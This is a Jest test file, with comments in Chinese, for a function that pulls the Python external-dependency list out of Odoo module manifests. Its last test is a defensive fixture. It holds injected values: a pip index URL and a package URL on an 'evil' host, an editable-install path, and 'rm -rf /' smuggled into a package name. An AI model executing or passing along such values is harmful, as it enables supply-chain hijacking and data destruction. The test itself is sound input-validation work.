// 意圖：模組的 Python 相依有兩處來源，manifest 的 external_dependencies['python'] 是 Odoo 安裝時
// 檢查的權威來源（不少模組只在此宣告、無 requirements.txt，如 idx_hj）。這裡驗證從 manifest 文字
// 正確抽出該清單——抽錯就會漏裝、部署卡在「external dependency not met」。
const { pythonExternalDeps } = require('../pipeline/env-agent');

test('多行 python 清單（idx_hj 風格）→ 全數抽出', () => {
  const manifest = `{
    "name": "idx維修",
    "external_dependencies": {
        "python": [
            "qrcode",
            "Pillow",
            "smbprotocol",
        ],
    },
    "depends": ["base"],
  }`;
  expect(pythonExternalDeps(manifest)).toEqual(['qrcode', 'Pillow', 'smbprotocol']);
});

test('單行 python 清單（queue_job 風格）→ 抽出', () => {
  const manifest = `{ "external_dependencies": {"python": ["requests"]}, "data": [] }`;
  expect(pythonExternalDeps(manifest)).toEqual(['requests']);
});

test('無 external_dependencies → 空陣列', () => {
  expect(pythonExternalDeps('{ "name": "x", "depends": ["base"] }')).toEqual([]);
});

test('external_dependencies 只有 bin（無 python）→ 空陣列，不誤抓', () => {
  const manifest = `{ "external_dependencies": { "bin": ["wkhtmltopdf"] } }`;
  expect(pythonExternalDeps(manifest)).toEqual([]);
});

test('非字串/空輸入 → 空陣列，不炸', () => {
  expect(pythonExternalDeps(null)).toEqual([]);
  expect(pythonExternalDeps('')).toEqual([]);
});

// 安全：manifest 由外部 repo 提供，惡意/畸形項（會被 pip 當旗標）必須丟棄，不得流到 pip argv
test('污染的 manifest 夾帶 pip 旗標/URL/路徑 → 白名單過濾掉，只留合法套件名', () => {
  const manifest = `{
    "external_dependencies": {
        "python": [
            "requests",
            "--index-url=http://evil/simple",
            "-e /tmp/x",
            "https://evil/pkg.tar.gz",
            "a b; rm -rf /",
            "smbprotocol==1.17.0",
        ],
    },
  }`;
  expect(pythonExternalDeps(manifest)).toEqual(['requests', 'smbprotocol==1.17.0']);
});
